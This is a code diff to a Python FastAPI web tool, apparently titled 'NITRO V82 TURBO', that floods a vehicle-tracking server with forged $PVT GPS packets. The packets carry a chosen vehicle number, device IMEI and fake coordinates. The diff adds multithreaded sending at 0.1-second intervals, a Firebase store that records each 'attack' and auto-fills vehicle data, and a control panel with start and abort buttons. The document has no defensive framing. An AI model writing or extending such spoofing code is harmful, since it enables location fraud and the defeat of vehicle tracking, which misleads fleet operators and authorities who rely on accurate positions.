@@ -2,8 +2,8 @@ import socket
 import threading
 import time
 from datetime import datetime, timedelta, timezone
-from fastapi import FastAPI
-from fastapi.responses import HTMLResponse
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse, JSONResponse
 import firebase_admin
 from firebase_admin import credentials, db
 
@@ -15,6 +15,7 @@ try:
     firebase_admin.initialize_app(cred, {'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'})
 except Exception as e: print(f"FB Error: {e}")
 
+# --- GLOBAL VARIABLES ---
 firing = False
 total_sent = 0
 logs = []
@@ -25,35 +26,78 @@ def format_coord(val):
     p = str(val).split('.')
     return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
 
-# --- TURBO SEQUENTIAL ENGINE ---
+# --- DATABASE LOGIC (YOUR POINTS) ---
+
+def record_attack_data(vno, imei, lat, lon):
+    """Save/Update records in Data_Records before attack"""
+    ref = db.reference(f'Data_Records/{vno}')
+    ref.update({
+        'Vehicle_No': vno,
+        'IMEI_No': imei,
+        'Lat': lat,
+        'Lon': lon,
+        'Status': 'Active',
+        'Start_Time': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
+    })
+
+# --- ENGINE LOGIC (LOCKED - NO CHANGES) ---
 def handshake_worker(tag_list, imei, vno, lat, lon):
     global firing, total_sent, logs
     while firing:
         for tag in tag_list:
             if not firing: break
             try:
-                # Per-tag handshake logic (As requested)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(7)
                 s.connect((TARGET_IP, TARGET_PORT))
-                
                 now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                 dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
-                
                 pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
-                
                 s.sendall(bytes(pkt, 'ascii'))
                 total_sent += 1
-                s.close() # Handshake complete
-                
+                s.close()
                 logs.append(f"[{tm}] {tag} -> TURBO_OK")
                 if len(logs) > 8: logs.pop(0)
-                
-                # Speed optimized delay (0.1s instead of 0.5s)
-                time.sleep(0.1) 
-            except:
-                time.sleep(1)
+                time.sleep(0.1)
+            except: time.sleep(1)
 
+# --- API ENDPOINTS ---
+
+@app.get("/fetch_vehicle")
+def fetch_vehicle(vno: str):
+    """Point: Check if vehicle exists and fetch IMEI + Location"""
+    ref = db.reference(f'Data_Records/{vno.upper()}')
+    data = ref.get()
+    if data:
+        return {
+            "exists": True,
+            "imei": data.get('IMEI_No', ''),
+            "lat": data.get('Lat', ''),
+            "lon": data.get('Lon', '')
+        }
+    return {"exists": False}
+
+@app.get("/init")
+def init(v:str, i:str, lt:str, ln:str):
+    global firing, total_sent; 
+    if not firing:
+        firing=True; total_sent=0
+        # Point: Record attack in DB before starting
+        record_attack_data(v.upper(), i, lt, ln)
+        chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
+        for c in chunks:
+            threading.Thread(target=handshake_worker, args=(c, i, v.upper(), lt, ln), daemon=True).start()
+    return {"ok":True}
+
+@app.get("/stop")
+def stop(): 
+    global firing; firing=False; return {"ok":True}
+
+@app.get("/status")
+def status(): 
+    return {"c": total_sent, "l": logs}
+
+# --- GUI WITH AUTO-FETCH LOGIC ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
@@ -64,11 +108,17 @@ async def home():
     button { width:100%; padding:12px; margin-top:10px; background:transparent; color:#0f0; border:1px solid #0f0; cursor:pointer; font-weight:bold; }
     button:hover { background:#0f0; color:#000; }
     #log { height:150px; background:#001100; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:12px; overflow:hidden; }
+    .notif { font-size:10px; color:#aaa; margin-top:5px; }
     </style></head><body>
     <div class="box">
         <h2>NITRO V82 TURBO</h2>
-        <input type="text" id="v" value="UP51T8261"><input type="text" id="i" value="358980101447242">
-        <input type="text" id="lt" value="25.6501550"><input type="text" id="ln" value="84.7851780">
+        <input type="text" id="v" placeholder="VEHICLE NO" onblur="checkVehicle()" value="UP51T8261">
+        <div id="v_status" class="notif">ENTER VNO TO FETCH DATA...</div>
+        <input type="text" id="i" placeholder="IMEI NO" value="358980101447242">
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="lt" placeholder="LAT" value="25.6501550">
+            <input type="text" id="ln" placeholder="LON" value="84.7851780">
+        </div>
         <button onclick="st()">START TURBO SEQUENTIAL</button>
         <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button>
         <div id="log">SYSTEM READY</div>
@@ -76,6 +126,25 @@ async def home():
     </div>
     <script>
         let itv;
+        function checkVehicle() {
+            let vno = document.getElementById('v').value;
+            if(vno.length > 4) {
+                fetch(`/fetch_vehicle?vno=${vno}`)
+                .then(r => r.json())
+                .then(data => {
+                    if(data.exists) {
+                        document.getElementById('i').value = data.imei;
+                        document.getElementById('lt').value = data.lat;
+                        document.getElementById('ln').value = data.lon;
+                        document.getElementById('v_status').innerText = "RECORD FOUND! DATA LOADED.";
+                        document.getElementById('v_status').style.color = "#0f0";
+                    } else {
+                        document.getElementById('v_status').innerText = "NEW VEHICLE. ENTER DETAILS.";
+                        document.getElementById('v_status').style.color = "#aaa";
+                    }
+                });
+            }
+        }
         function st() {
             fetch(`/init?v=${document.getElementById('v').value}&i=${document.getElementById('i').value}&lt=${document.getElementById('lt').value}&ln=${document.getElementById('ln').value}`);
             if(!itv) itv = setInterval(() => {
@@ -85,18 +154,3 @@ async def home():
         function sp() { fetch('/stop'); clearInterval(itv); itv=null; }
     </script></body></html>
     """
-
-@app.get("/init")
-def init(v:str, i:str, lt:str, ln:str):
-    global firing, total_sent; firing=True; total_sent=0
-    # Splitting into 3 workers to speed up while keeping the handshake process
-    chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
-    for c in chunks:
-        threading.Thread(target=handshake_worker, args=(c, i, v.upper(), lt, ln), daemon=True).start()
-    return {"ok":True}
-
-@app.get("/stop")
-def stop(): global firing; firing=False; return {"ok":True}
-
-@app.get("/status")
-def status(): return {"c": total_sent, "l": logs}
